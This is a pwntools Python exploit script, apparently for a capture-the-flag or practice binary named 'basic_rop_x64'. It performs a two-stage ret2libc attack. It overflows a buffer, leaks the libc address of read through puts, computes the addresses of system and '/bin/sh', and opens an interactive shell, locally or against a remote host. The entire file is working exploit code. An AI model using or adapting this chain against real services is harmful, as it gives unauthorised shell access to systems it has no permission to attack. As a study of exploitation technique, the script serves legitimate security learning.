from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)
# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
b vuln
'''.format(**locals())
# Set up pwntools for the correct architecture
exe = './basic_rop_x64'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
libc = ELF('./libc.so.6')
context.log_level = 'debug'
# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
io = start()

offsets = 72

pop_rdi = p64(0x0000000000400883)
ret = p64(0x00000000004005a9)

plt_puts = p64(elf.plt['puts'])
got_read = p64(elf.got['read'])


payload = b'A' * offsets
payload += pop_rdi + got_read + plt_puts
payload += p64(elf.sym['main'])

io.sendline(payload)
io.recv(0x40)

# log.info(str(io.recv(1)))

leak = u64(io.recv(6).ljust(8,b'\x00'))
log.info(hex(leak))
# log.info(str(io.recv(1)))

libcbase = leak - libc.sym['read']
print("libcbase: "+str(hex(libcbase)))

system = libcbase+libc.sym['system']
print("system: "+str(hex(system)))

binsh = libcbase+list(libc.search(b"/bin/sh"))[0]
print("binsh: "+str(hex(binsh)))
    
payload = flat(
    asm('nop') * offsets,
    ret,
    pop_rdi,
    binsh,
    system,

    )

io.sendline(payload)

io.interactive()

